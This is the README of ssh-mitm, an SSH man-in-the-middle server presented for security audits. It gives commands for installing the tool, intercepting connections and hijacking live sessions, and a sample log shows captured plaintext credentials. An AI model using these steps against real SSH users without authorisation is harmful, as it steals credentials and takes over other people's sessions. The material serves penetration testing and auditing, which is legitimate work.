[![CodeFactor](https://www.codefactor.io/repository/github/ssh-mitm/ssh-mitm/badge)](https://www.codefactor.io/repository/github/ssh-mitm/ssh-mitm)
[![PyPI downloads](https://pepy.tech/badge/ssh-mitm/month)](https://pepy.tech/project/ssh-mitm)
[![GitHub](https://img.shields.io/github/license/ssh-mitm/ssh-mitm.svg)](https://github.com/ssh-mitm/ssh-mitm/blob/master/LICENSE)

# ssh-mitm - intercept ssh traffic

**man in the middle (mitm) server for security audits supporting public key authentication, session hijacking and file manipulation**

![SSH-MITM example](https://ssh-mitm.at/img/mitm-example.png)

## Give a Star! :star:
If you like or are using this project to learn or start your solution, please give it a star. Thanks!

## Installation of SSH-MITM

The first step to using any software package is getting it properly installed.

To install SSH-MITM, simply run this simple command in your terminal of choice:

    $ pip install ssh-mitm

## Quickstart

Starting an intercepting mitm-ssh server with password authentication and session hijacking is very simple.

All you have to do is run this command in your terminal of choice.

    $ ssh-mitm --remote-host 192.168.0.x

Now let's try to connect to the ssh-mitm server.
The ssh-mitm server is listening on port 10022.

    $ ssh -p 10022 user@proxyserver

You will see the credentials in the log output.

    2021-01-01 11:38:26,098 [INFO]  Client connection established with parameters:
        Remote Address: 192.168.0.x
        Port: 22
        Username: user
        Password: supersecret
        Key: None
        Agent: None


## Session hijacking

Getting the plain text credentials is only half the fun.
When a client connects, the ssh-mitm starts a new server, which is used for session hijacking.

    2021-01-01 11:42:43,699 [INFO]  created injector shell on port 34463. connect with: ssh -p 34463 127.0.0.1

To hijack the session, you can use your favorite ssh client. This connection does not require authentication.

    $ ssh -p 34463 127.0.0.1

After you are connected, your session will only be updated with new responses, but you are able to execute commands.

Try to execute somme commands in the hijacked session or in the original session.

The output will be shown in both sessions.
